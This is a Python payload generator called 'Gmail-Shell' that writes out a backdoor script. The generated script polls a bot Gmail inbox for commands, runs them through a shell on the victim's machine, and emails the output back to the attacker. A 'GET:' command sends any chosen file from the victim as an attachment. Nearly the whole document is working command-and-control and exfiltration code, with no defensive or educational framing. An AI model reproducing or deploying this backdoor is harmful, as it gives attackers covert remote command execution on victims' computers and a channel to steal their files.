'''
    Gmail shell, This payload generator
    Author = Riadh Benlamine
    Version = 2
'''
import getpass

print('\t\tGmail-Shell 2v')
print('paylaod generator')
reverse_email = input('Enter your gmail:')
bot_email = input('bot gmail:')
bot_password = getpass.getpass('bot\'s gmail password:')
payload_name = input('File name [test.py]:')
print('Gerenating your payload...')

payload = '''import imaplib
import smtplib
import email
import subprocess
import base64
import multiprocessing
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders\n
'''
payload += f'''
b_e = \'{bot_email}\'
b_p = \'{bot_password}\'
r_e = \'{reverse_email}\'
'''
payload += '''
def mail():
    try:
        mail = imaplib.IMAP4_SSL('imap.gmail.com')
        mail.login(b_e, b_p)
        mail.select('inbox')
        result, data = mail.uid('search', None, 'UnSeen')
        latest_email_uid = data[0].split()[-1]
        result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')
        raw_email = data[0][1]
        msg = email.message_from_bytes(raw_email)
        hdr = email.header.make_header(email.header.decode_header(msg['Subject']))
        subject = str(hdr)

        for part in msg.walk():
            body = part.get_payload(decode=True)
            if body is not None:
                break
        return body.decode()
    except:
        return 0
'''
payload += '''
def send(data=None, path=None):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(b_e, b_p)
        if path is not None:
            msg = MIMEMultipart()
            msg['From'] = b_e
            msg['To'] = ','.join(r_e)
            msg['Subject'] = "Gmail-Shell Output"
            body = 'You requested file'
            msg.attach(MIMEText(body, 'plain'))
            file_name = path.split('/')[-1]
            file_content = open(path, 'rb').read()
            base = MIMEBase('application', 'octet-stream')
            base.set_payload(file_content)
            encoders.encode_base64(base)
            base.add_header('Content-Disposition', f"attachment; filename= {file_name}")
            msg.attach(base)
            text = msg.as_string()
            server.sendmail(b_e, r_e, text)
        if data:
            server.sendmail(b_e, r_e, str(data).encode())
    except:
        pass
'''
payload += '''
def analyzer(command):
    if 'GET:' in command:
        file_path = command.replace("GET:", '')
        send(path=file_path)
    else:
        pass
'''

payload += '''
def run(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0].decode()

def main():
    command = mail()
    if isinstance(command, str):
        try:
            command = command.replace('\\r', '').replace('\\n', '')
            analyzer(command)
            command_output = run(command)
            text = f"Output: {command_output}"
            payload = base64.b64encode(text.encode())
            send(data=payload)
        except FileNotFoundError:
            pass
    else:
        pass
'''
payload += '''
if __name__ == '__main__':
    proc = multiprocessing.Process(target=main)
    proc.start()
'''
with open(payload_name, 'w') as pay:
    pay.write(payload)
print('Done.')